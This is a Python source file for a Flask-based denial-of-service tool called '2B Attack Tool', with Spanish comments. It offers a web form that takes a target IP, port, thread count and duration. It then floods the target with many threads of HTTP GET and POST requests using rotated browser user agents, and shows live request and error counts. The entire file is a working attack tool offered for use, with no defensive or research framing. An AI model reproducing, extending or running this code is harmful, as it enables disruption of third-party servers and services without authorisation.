#!/usr/bin/env python3
import os
import sys
import socket
import random
import time
import threading
from concurrent.futures import ThreadPoolExecutor
from flask import Flask, render_template_string, request

app = Flask(__name__)

# Configuración optimizada para Windows
VERSION = "2B Windows v2.0 (Fixed)"
DEFAULT_THREADS = 100
DEFAULT_DURATION = 30

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0"
]

class WindowsAttackController:
    def __init__(self):
        self.is_attacking = False
        self.stats = {"requests": 0, "errors": 0}
        self.lock = threading.Lock()
        self.start_time = 0

    def generate_request(self, target, port):
        method = random.choice(["GET", "POST"])
        path = random.choice(["/", "/index.html", "/test"])
        headers = [
            f"User-Agent: {random.choice(USER_AGENTS)}",
            f"Host: {target}",
            "Connection: keep-alive"
        ]
        return f"{method} {path} HTTP/1.1\r\n" + "\r\n".join(headers) + "\r\n\r\n"

    def attack_thread(self, target, port, duration):
        end_time = time.time() + duration
        while self.is_attacking and time.time() < end_time:
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(2)
                    s.connect((target, port))
                    s.send(self.generate_request(target, port).encode())
                    with self.lock:
                        self.stats["requests"] += 1
                    time.sleep(0.05)
            except Exception:
                with self.lock:
                    self.stats["errors"] += 1
                time.sleep(0.1)

    def start_attack(self, target, port, threads, duration):
        if not self.is_attacking:
            self.is_attacking = True
            self.stats = {"requests": 0, "errors": 0}
            self.start_time = time.time()
            
            # Usamos ThreadPoolExecutor para mejor manejo en Windows
            with ThreadPoolExecutor(max_workers=threads) as executor:
                for _ in range(threads):
                    executor.submit(self.attack_thread, target, port, duration)
            
            self.is_attacking = False
            return True
        return False

controller = WindowsAttackController()

# Plantilla HTML optimizada
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>2B Tool</title>
    <meta http-equiv="refresh" content="1">
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #1e1e1e; color: #fff; }
        .container { max-width: 800px; margin: 0 auto; padding: 20px; }
        button { background: #0078d7; color: white; border: none; padding: 10px; margin: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>2B Attack Tool</h1>
        <form method="POST">
            <input type="text" name="target" placeholder="Target IP" required>
            <input type="number" name="port" placeholder="Port" value="80">
            <input type="number" name="threads" placeholder="Threads" value="{{ threads }}">
            <input type="number" name="duration" placeholder="Duration (s)" value="{{ duration }}">
            <button type="submit" name="action" value="start">Start</button>
            <button type="submit" name="action" value="stop">Stop</button>
        </form>
        <div class="status">
            <h3>Status: {% if controller.is_attacking %}ATTACKING{% else %}READY{% endif %}</h3>
            <p>Requests: {{ controller.stats.requests }}</p>
            <p>Errors: {{ controller.stats.errors }}</p>
            <p>Running: {{ (time.time() - controller.start_time)|round(1) }}s</p>
        </div>
    </div>
</body>
</html>
"""

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        action = request.form.get('action')
        if action == 'start':
            target = request.form.get('target')
            port = int(request.form.get('port', 80))
            threads = int(request.form.get('threads', DEFAULT_THREADS))
            duration = int(request.form.get('duration', DEFAULT_DURATION))
            
            attack_thread = threading.Thread(
                target=controller.start_attack,
                args=(target, port, threads, duration),
                daemon=True
            )
            attack_thread.start()
            
        elif action == 'stop':
            controller.is_attacking = False
    
    return render_template_string(
        HTML_TEMPLATE,
        controller=controller,
        threads=DEFAULT_THREADS,
        duration=DEFAULT_DURATION,
        time=time.time
    )

if __name__ == '__main__':
    print(f"\n[+] 2B Attack Tool {VERSION}")
    print("[+] Starting web interface at http://127.0.0.1:5000\n")
    app.run(host='127.0.0.1', port=5000, threaded=True)